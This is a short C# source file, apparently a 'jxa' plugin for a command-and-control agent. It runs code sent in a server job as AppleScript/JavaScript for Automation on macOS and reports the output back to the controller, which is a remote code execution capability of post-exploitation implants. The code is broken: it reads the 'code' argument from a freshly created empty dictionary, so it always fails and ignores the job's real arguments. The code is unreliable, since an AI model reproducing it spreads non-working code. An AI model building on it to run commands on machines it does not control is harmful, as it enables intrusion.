﻿using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Text;
using OSXIntegration.Framework;
using Agent.Framework;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "jxa";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = new Dictionary<string, string>();
            await messageManager.WriteLine(AppleScript.Run(args["code"]), job.task.id, true);
        }
    }
}
